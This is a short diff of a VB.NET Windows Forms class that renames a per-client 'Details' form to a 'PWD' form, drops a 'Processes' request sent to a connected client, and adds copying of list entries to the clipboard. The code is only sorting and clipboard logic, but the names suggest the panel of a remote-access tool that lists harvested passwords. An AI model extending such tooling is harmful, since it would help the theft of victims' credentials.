@@ -1,22 +1,16 @@
-﻿Public Class Details
+﻿Public Class PWD
     Public F As Form1
     Public C As C
     Private m_SortingColumn As ColumnHeader
 
-    Private Sub Details_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        Me.Text = C.L.Text + "_" + C.ip
+    Private Sub PWD_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Me.Text = "PWD"
     End Sub
-
-    Private Sub TabPage2_click(sender As Object, e As EventArgs) Handles TabPage2.Enter
-        On Error Resume Next
-        C.SendText("Processes")
-    End Sub
-
 
     ' Sort using the clicked column.
-    Private Sub lvwBooks_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles ListView2.ColumnClick
+    Private Sub lvwBooks_ColumnClick(ByVal sender As System.Object, ByVal e As ColumnClickEventArgs) Handles ListView1.ColumnClick
         ' Get the new sorting column.
-        Dim new_sorting_column As ColumnHeader = ListView2.Columns(e.Column)
+        Dim new_sorting_column As ColumnHeader = ListView1.Columns(e.Column)
 
         ' Figure out the new sorting order.
         Dim sort_order As System.Windows.Forms.SortOrder
@@ -51,9 +45,19 @@
         End If
 
         ' Create a comparer.
-        ListView2.ListViewItemSorter = New Form1.ListViewComparer(e.Column, sort_order)
+        ListView1.ListViewItemSorter = New Form1.ListViewComparer(e.Column, sort_order)
 
         ' Sort.
-        ListView2.Sort()
+        ListView1.Sort()
+    End Sub
+
+    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
+        Try
+            If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(2).Text.Length > 0) Then
+                Clipboard.SetText(Me.ListView1.SelectedItems.Item(0).SubItems.Item(2).Text + " " + Me.ListView1.SelectedItems.Item(0).SubItems.Item(3).Text + " " + Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text)
+            End If
+        Catch exception1 As Exception
+
+        End Try
     End Sub
 End Class
